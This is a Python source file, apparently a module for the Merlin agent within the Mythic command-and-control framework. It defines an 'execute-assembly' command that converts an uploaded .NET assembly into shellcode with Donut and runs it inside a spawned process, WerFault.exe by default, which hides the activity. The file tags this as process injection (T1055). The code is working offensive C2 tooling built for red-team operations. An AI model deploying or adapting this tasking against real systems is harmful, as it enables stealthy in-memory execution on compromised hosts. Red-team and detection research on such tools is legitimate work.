
from merlin import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json

# Set to enable debug output to Mythic
debug = False


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                display_name=".NET Assembly",
                type=ParameterType.File,
                description="Upload a new .NET assembly you want to execute",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="New File",
                    ui_position=0,
                    required=True,
                )],
            ),
            CommandParameter(
                name="filename",
                cli_name="assembly",
                display_name=".NET Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=get_file_list,
                description=".NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=0,
                    required=True,
                )],
            ),
            CommandParameter(
                name="arguments",
                cli_name="args",
                display_name=".NET Assembly Arguments",
                type=ParameterType.String,
                description="Arguments to execute the .NET assembly with",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Default",
                        ui_position=1,
                        required=False,
                    ),
                    ParameterGroupInfo(
                        group_name="New File",
                        ui_position=1,
                        required=False,
                    ),
                ],
            ),
            CommandParameter(
                name="spawnto",
                cli_name="spawnto",
                display_name="SpawnTo Program",
                type=ParameterType.String,
                description="The child process that will be started to execute the assembly in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Default",
                        ui_position=2,
                        required=True,
                    ),
                    ParameterGroupInfo(
                        group_name="New File",
                        ui_position=2,
                        required=True,
                    ),
                ],
            ),
            CommandParameter(
                name="spawntoargs",
                cli_name="spawnto-args",
                display_name="SpawnTo Arguments",
                type=ParameterType.String,
                description="Argument to create the spawnto process with, if any",
                parameter_group_info=[
                    ParameterGroupInfo(
                        group_name="Default",
                        ui_position=3,
                        required=False,
                    ),
                    ParameterGroupInfo(
                        group_name="New File",
                        ui_position=3,
                        required=False,
                    ),
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                pass


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute-assembly"
    needs_admin = False
    help_cmd = "execute-assembly <assembly name> <spawnto> <spawnto arguments>\n" \
               "execute-assembly -assembly <assembly name> -args <assembly argumetns> -spawnto <spawnto> " \
               "-spawnto-args <spawnto-arguments>"
    description = "Convert a .NET assembly into shellcode with Donut, execute it in the SpawnTo process, and return " \
                  "the output\n\n" \
                  "Change the Parameter Group to \"Default\" to use a file that was previously registered with " \
                  "Mythic and \"New File\" to register and use a new file from your host OS.\n"
    version = 1
    author = "@Ne0nd0g"
    argument_class = ExecuteAssemblyArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if debug:
            await MythicRPC().execute(function_name="create_output", task_id=task.id, output=f'\n[DEBUG]Input task:{task}')

        assembly_name, assembly_uuid, assembly = await get_file_contents(task)

        # Donut
        donut_args = {
            "params": task.args.get_arg("arguments"),
            "exit": "2",
            "verbose": True,
        }
        donut_shellcode, donut_result = donut(base64.b64decode(assembly), donut_args)
        task.stdout += f'\n{donut_result}'

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [
            donut_shellcode,
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.display_params = f'{assembly_name} {task.args.get_arg("arguments")}\n ' \
                              f'SpawnTo: {task.args.get_arg("spawnto")} ' \
                              f'SpawnTo Args: {task.args.get_arg("spawntoargs")}'

        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("file")
        task.args.remove_arg("filename")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass
